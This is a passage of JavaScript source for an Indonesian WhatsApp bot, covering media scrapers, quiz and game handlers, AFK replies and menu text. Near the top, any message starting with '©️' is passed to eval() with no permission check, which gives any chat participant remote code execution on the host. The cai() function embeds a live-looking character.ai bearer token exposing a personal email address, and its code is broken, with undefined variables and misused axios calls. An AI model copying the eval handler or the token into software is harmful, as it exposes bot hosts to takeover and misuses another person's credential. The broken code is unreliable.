messages.key.fromMe = areJidsSameUser(m.sender, lenwy.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
lenwy.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await lenwy.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Kamiya汉`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

async function aigpt(prompt) {
  try {
   const response = await axios.get("https://tools.revesery.com/ai/ai.php?query=" + prompt, {
     headers: {
      'Accept': '*/*',
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.999 Safari/537.36'
      }
    });
    const res = response.data
    const evaled = res.result
    /*
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(evaled)
*/
  } catch (error) {
  console.error(error)
  }
}

async function ttslide(text) {
    let response = await axios.get(`https://dlpanda.com/id?url=${text}&token=G7eRpMaa`)
    const html = response.data
    const $ = cheerio.load(html)
    let asd = []
    let imgSrc = []
    let creator = 'Jikarinka'
    $('div.col-md-12 > img').each((index,
        element) => {
        imgSrc.push($(element).attr('src'))
    })
    asd.push({
        creator,
        imgSrc
    })
    let fix = imgSrc.map((e,
        i) => {
        return {
            img: e,
            creator: creator[i]
        }
    })
    for (let i of asd) {
        return i
    }
}

async function cai(query) {
        let token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkVqYmxXUlVCWERJX0dDOTJCa2N1YyJ9.eyJnaXZlbl9uYW1lIjoiUkNTIiwiZmFtaWx5X25hbWUiOiJYWiIsIm5pY2tuYW1lIjoicmNzeHo2NDkiLCJuYW1lIjoiUkNTIFhaIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0lYbGpRdW11SWlQTjdwLUoxUk1HNjZ0ODZzTzJhMG9DcW93RTlZVDFzaj1zOTYtYyIsImxvY2FsZSI6ImlkIiwidXBkYXRlZF9hdCI6IjIwMjMtMTEtMDVUMTQ6NTM6NDkuNjM0WiIsImVtYWlsIjoicmNzeHo2NDlAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImlzcyI6Imh0dHBzOi8vY2hhcmFjdGVyLWFpLnVzLmF1dGgwLmNvbS8iLCJhdWQiOiJkeUQzZ0UyODFNcWdJU0c3RnVJWFloTDJXRWtucVp6diIsImlhdCI6MTY5OTE5NjAzNCwiZXhwIjoxNzAyNzk2MDM0LCJzdWIiOiJnb29nbGUtb2F1dGgyfDExMDY5MjA2MTkzMTI0MTU4NTgwNSIsInNpZCI6IjVhaklfSlRJeFBZWGpzU0piWmdzRnQ4MXhaTHRhRERyIiwibm9uY2UiOiJUQzE0V2xvMVNGSmlkVU5FWVVSbFJXb3dTV3RJU25acVRtVTRVR3hoUldReU0xQm5Rbk0yYjAwNWJ3PT0ifQ.jduu283Aycw7GwUL270EkwoF71bINRrLnFzVJGpoG9uOO4A-jxtZ07XRZIr_t4lT_gt2N19BWXg7SGxRR_coFbCJLfyUHLzxx6ZaDGMqUnCPhJ6WXBHABsTsqnlQIJs1sQPJyLKw01-FU5FoB8atW3OIyjt0nJayJtMSm4NzKkGR2gBWZSNR3FIqX7r4NY_wUSc-1Za50FaMiLg3XdGkfE59wxs_NdlxxdPVVG4G4uKBWQCIy6ofRDnnb22Wfw1knt8yXMjGfq8RtSsAkGMmjp_KVICSRDCqy0cCOtUdmih5LCRyEQagIRBl90SP753C7ehiue_ucidCYh9XrxP7HQ";
    return new Promise(async (resolve, reject) => {
    try {
        const request = await axios({
            method: "POST",
            url: "https://beta.character.ai/chat/streaming/",
            body: JSON.stringify(query),
            headers: {
            "authorization": "Token " + token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            client: "Token " + token
            }
            })

        if (request.status() === 200) {
            const response = await JSON.parse(request);
            const replies = response.replies;

            const messages = []

            for (let i = 0; i < replies.length; i++) {
                lenwy.sendMessage(i, {text: `${text}`}, {quoted:m})
            }
            resolve(i);
            }
        } catch (error) {
      reject(error);
    }
})
}

async function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        reject("*Tidak Ada Video Yang Ditemukan* 😥");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        resolve(result);
      }
    } catch (error) {
      reject(error);
    }
  });
}

async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}

const clean = (data) => {
  let regex = /(<([^>]+)>)/gi;
  data = data.replace(/(<br?\s?\/>)/gi, " \n");
  return data.replace(regex, "");
};

async function shortener(url) {
  return url;
}

async function tiktok(query) {
  let response = await axios("https://lovetik.com/api/ajax/search", {
    method: "POST",
    data: new URLSearchParams(Object.entries({ query })),
  });

  result = {};

  result.creator = "YNTKTS";
  result.title = clean(response.data.desc);
  result.author = clean(response.data.author);
  result.nowm = await shortener(
    (response.data.links[0].a || "").replace("https", "http")
  );
  result.watermark = await shortener(
    (response.data.links[1].a || "").replace("https", "http")
  );
  result.audio = await shortener(
    (response.data.links[2].a || "").replace("https", "http")
  );
  result.thumbnail = await shortener(response.data.cover);
  return result;
}

async function filterValidImages(images, limit) {
  const validImages = [];
  for (const image of images) {
    if (await isImageURL(image)) {
      validImages.push(image);
      if (validImages.length >= limit) {
        break; // Hentikan jika sudah mencapai jumlah gambar yang diminta
      }
    }
  }
  return validImages;
}

async function isImageURL(url) {
  try {
    const res = await fetch(url, { method: 'HEAD' });
    const contentType = res.headers.get('content-type');
    return contentType && contentType.startsWith('image'); // Memeriksa apakah tipe file adalah gambar
  } catch (error) {
    return false; // Jika terjadi kesalahan dalam memeriksa URL, mengembalikan false
  }
}

const sendapk = (teks) => {
lenwy.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
reply('*Salah Woi !! Yang Bener Contoh : Yoapk Kamiya*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
lenwy.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
reply('*Salah Woi !! Yang Bener Contoh : Yozip Kamiya*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
lenwy.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
reply('*Salah Woi !! Yang Bener Contoh : Yopdf Kamiya*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
lenwy.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted:m})
}

for (let anju of vnnye) {
if (budy.match(anju)) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await lenwy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 lenwy.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await lenwy.sendText(room.x, str, m, { mentions: parseMention(str) } )
await lenwy.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
lenwy.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
lenwy.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) lenwy.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) lenwy.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) lenwy.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
lenwy.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) lenwy.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) lenwy.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
lenwy.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`⚠️ *Jangan Tag Dia!*
⨠ *Dia Sedang AFK* ${reason ? '*Dengan Alasan* : ' + reason : 'tanpa alasan'}
⨠ *Selama* ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
❄️️ *${pushname} Kembali Dari Afk*\n\n❄️️ ${user.afkReason ? ' *Dengan Alasan* : ' + user.afkReason : ''}\n\n❄️️  *Selama* : ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

switch(command) { 
case 'menu': 
case 'mainmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
const owned = owner + "@s.whatsapp.net"
let anu = `▢ *Hello Im ©Project Kamiya汉 V3* 👋
▢ *WhatsApp Bot To Solve Your Problems* 🙌
▢ *Please Dont Call Bots Or Your May Get Blocked* 🚫

▢ *Info Bot*  
   ⨠ *Creator : ${owned.split("@")[0]}*
   ⨠ *Runtime : ${runtime(process.uptime())}*
   ⨠ *Mode Bot : ${lenwy.public ? `Public Mode` : `Self Mode`}*

▢ *Info User*
   ⨠ *Name : ${pushname}*
   ⨠ *Number : ${m.sender.split('@')[0]}*
   ⨠ *Status : ${isOwner ? "❄️️ Owner" : "🍁 User"}*

▢ *Keterangan*
   ⨠ *Help : Menunjukkan Panduan*
   ⨠ *Menu : Menunjukkan Simple Menu*
   ⨠ *Allmenu : Menunjukkan Semua Menu*

▢ *Menu Bot*
   ⨠ *AiMenu ( Menu Ai )*
   ⨠ *Funmenu ( Menu Fun )*
   ⨠ *Gamemenu ( Menu Game )*
   ⨠ *Menunsfwmode34 (Menu Nsfw)*
   ⨠ *Groupmenu ( Menu Grup )*
   ⨠ *Beritamenu ( Menu Berita )*
   ⨠ *Randommenu ( Menu Random )*
   ⨠ *Downmenu ( Menu Download )*
   ⨠ *Weebsmenu ( Menu Wibu )*
   ⨠ *Quotesmenu ( Menu Quotes )*
   ⨠ *Searchmenu ( Menu Search )*
   ⨠ *Convertmenu ( Convert Media )*
   ⨠ *Favmenu ( Menu Favorite )*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`
lenwy.sendMessage(m.chat, {
    video: fs.readFileSync('./data/video/menu.mp4'),
    caption: anu,
    gifPlayback: true,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "©Project Kamiya汉 V3",
        thumbnailUrl: "https://telegra.ph/file/24f30f85f768682d31915.jpg",
        sourceUrl: "https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L",
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
   })
await sleep(1000)
lenwy.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/private.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: len })
}
break

case 'almenu': 
case 'allmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
const owned = owner + "@s.whatsapp.net"
let anu = `▢ *Hello Im Project Kamiya汉 V3* 👋
▢ *WhatsApp Bot To Solve Your Problems* 🙌
▢ *Please Dont Call Bots Or Your May Get Blocked* 🚫

▢ *Info Bot*  
   ⨠ *Creator : ${owned.split("@")[0]}*
   ⨠ *Runtime : ${runtime(process.uptime())}*
   ⨠ *Mode Bot : ${lenwy.public ? `Public Mode` : `Self Mode`}*

▢ *Info User*
   ⨠ *Name : ${pushname}*
   ⨠ *Number : ${m.sender.split('@')[0]}*
   ⨠ *Status : ${isOwner ? "❄️️ Owner" : "🍁 User"}*

▢ *Keterangan*
   ⨠ *Help : Menunjukkan Panduan*
   ⨠ *Menu : Menunjukkan Simple Menu*
   ⨠ *Allmenu : Menunjukkan Semua Menu*

▢ *Ai Menu*
   ⨠ *Ai*
   ⨠ *Ask*
   ⨠ *Play*
   ⨠ *Song*
   ⨠ *Aimage*
   ⨠ *OpenAi*
   ⨠ *Remini*
   ⨠ *Pinterest*
   ⨠ *Animediff*

▢ *Fun Menu*
   ⨠ *Truth*
   ⨠ *Dare*
   ⨠ *Rate*
   ⨠ *Apakah*
   ⨠ *Kapankah*
   ⨠ *Bisakah*
   ⨠ *Bagaimanakah* 
   ⨠ *Gantengcek*
   ⨠ *Cekganteng*
   ⨠ *Cantikcek*
   ⨠ *Cekcantik*
   ⨠ *Sangecek*
   ⨠ *Ceksange*
   ⨠ *Gaycek*
   ⨠ *Cekgay*
   ⨠ *Lesbicek*
   ⨠ *Ceklesbi*

▢ *Game Menu*
   ⨠ *TTC*
   ⨠ *Deltc*
   ⨠ *Tebak Kata*
   ⨠ *Tebak Gambar*
   ⨠ *Tebak Lirik*
   ⨠ *Tebak Kalimat*
   ⨠ *Tebak Lagu*
   ⨠ *Tebak Lontong*
   ⨠ *Kuismath Noob*
   ⨠ *Kuismath Easy*
   ⨠ *Kuismath Medium*
   ⨠ *Kuismath Hard*
   ⨠ *Kuismath Extreme*
   ⨠ *Kuismath Imposibble*
   ⨠ *Kuismath Imposibble2*

▢ *Group Menu*
   ⨠ *Welcome on / off*
   ⨠ *Setwelcome (teks)*
   ⨠ *Antilink on / off*
   ⨠ *Antitoxic on / off*
   ⨠ *Autodown on / off*
   ⨠ *Nsfw on / off*
   ⨠ *Bcgc (textnya)*
   ⨠ *Share (textnya)*
   ⨠ *Hidetag (textnya)*
   ⨠ *Kick (628xx)*
   ⨠ *Add (628xx)*
   ⨠ *Group close / open*
   ⨠ *Promote (628xx)*
   ⨠ *Demote (628xx)*
   ⨠ *Sendlinkgc (628xx)*
   ⨠ *Editgroup close / open*
   ⨠ *Editinfo on / off*
   ⨠ *Join (linknya)*
   ⨠ *Editsubjek (textnya)*
   ⨠ *Editdesk (textnya)*
   ⨠ *Tagall (textnya)*
   ⨠ *Inspect (linknya)*
   ⨠ *Linkgroup*
   ⨠ *Resetlinkgc*
   ⨠ *Buatsw*
   ⨠ *Buatswimage*
   ⨠ *Buatswvideo*
   ⨠ *Swin*
   ⨠ *Vnsw*
   ⨠ *Buatswptv*
   ⨠ *Toptv*
   ⨠ *Buatsws*

 ▢ *Berita Menu*
   ⨠ *Inews*
   ⨠ *Kontan*
   ⨠ *KompasNews*
   ⨠ *DetikNews*
   ⨠ *DailyNews*

▢ *Random Menu*
   ⨠ *Afk*
   ⨠ *Owner*
   ⨠ *Nickff*
   ⨠ *Puisi*
   ⨠ *Pantun*
   ⨠ *Sticker*
   ⨠ *Sewa*
   ⨠ *Faktaunik*
   ⨠ *Couple*
   ⨠ *Meme*
   ⨠ *Getname*
   ⨠ *Getpic*
   ⨠ *Stalktiktok*
   ⨠ *Qc*
   ⨠ *Qcstick*
   ⨠ *Lirik*

▢ *Download Menu*
   ⨠ *Igdl (linknya)*
   ⨠ *Igslide (linknya)*
   ⨠ *Tiktok (linknya)*
   ⨠ *Ttslide (linknya)*
   ⨠ *Ytmp3 (linknya)*
   ⨠ *Ytmp4 (linknya)*
   ⨠ *Mediafire (linknya)*

▢ *Weebs Menu*
   ⨠ *Pat*
   ⨠ *Cry*
   ⨠ *Hug*
   ⨠ *Nom*
   ⨠ *Awoo*
   ⨠ *Kiss*
   ⨠ *Kill*
   ⨠ *Lick*
   ⨠ *Bite*
   ⨠ *Yeet*
   ⨠ *Bonk*
   ⨠ *Wink*
   ⨠ *Poke*
   ⨠ *Slap*
   ⨠ *Bully*
   ⨠ *Smile*
   ⨠ *Wave*
   ⨠ *Blush*
   ⨠ *Smug*
   ⨠ *Glomp*
   ⨠ *Happy*
   ⨠ *Dance*
   ⨠ *Cuddle*
   ⨠ *Cringe*
   ⨠ *Highfive*
   ⨠ *Handhold*

▢ *Quotes Menu*
   ⨠ *FML*
   ⨠ *Bucin*
   ⨠ *Quotes*
   ⨠ *Motivasi*
   ⨠ *Katabijak*
   ⨠ *Katacinta*
   ⨠ *Katagalau*
   ⨠ *Katahacker*
   ⨠ *Katailham*
   ⨠ *Katasenja*
   ⨠ *Katasindiran*
   ⨠ *Quotesanime*
   ⨠ *Quotespubg*
   ⨠ *Quotesislamic*

▢ *Search Menu*
   ⨠ *Ai*
   ⨠ *Play*
   ⨠ *Song*
   ⨠ *Jarak*
   ⨠ *Google*
   ⨠ *OpenAi*
   ⨠ *Ytsearch*
   ⨠ *Infogempa*

▢ *Convert Menu*
   ⨠ *Wm*
   ⨠ *Nobg*
   ⨠ *Toimage*
   ⨠ *Tomp3*
   ⨠ *Togif*
   ⨠ *Tourl*
   ⨠ *Smeme*
   ⨠ *Colorize*
   ⨠ *Attp (textnya)*
   ⨠ *Ttp (textnya)*

▢ *Favorite Menu*
   ⨠ *Ai*
   ⨠ *Wm*
   ⨠ *S*
   ⨠ *Hd*
   ⨠ *Pin*
   ⨠ *Smeme*
   ⨠ *Play*
   ⨠ *Toimg*
   ⨠ *Remini*
   ⨠ *Animediff*
   ⨠ *Ig (Linknya)*
   ⨠ *Tiktok (Linknya)*
   ⨠ *Ttsearch (Teks)*
   ⨠ *Ytmp3 (Linknya)*
   ⨠ *Ytmp4 (Linknya)*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`
lenwy.sendMessage(m.chat, {
    video: fs.readFileSync('./data/video/menu.mp4'),
    caption: anu,
    gifPlayback: true,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "©Project Kamiya汉 V3",
        thumbnailUrl: "https://telegra.ph/file/24f30f85f768682d31915.jpg",
        sourceUrl: "https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L",
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
   })
await sleep(1000)
lenwy.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/private.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: len })
}
break

case 'groupmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Group Menu*
 ⨠ *Welcome on / off*
 ⨠ *Setwelcome (teks)*
 ⨠ *Antilink on / off*
 ⨠ *Antitoxic on / off*
 ⨠ *Autodown on / off*
 ⨠ *Nsfw on / off*
 ⨠ *Bcgc (textnya)*
 ⨠ *Share (textnya)*
 ⨠ *Hidetag (textnya)*
 ⨠ *Kick (628xx)*
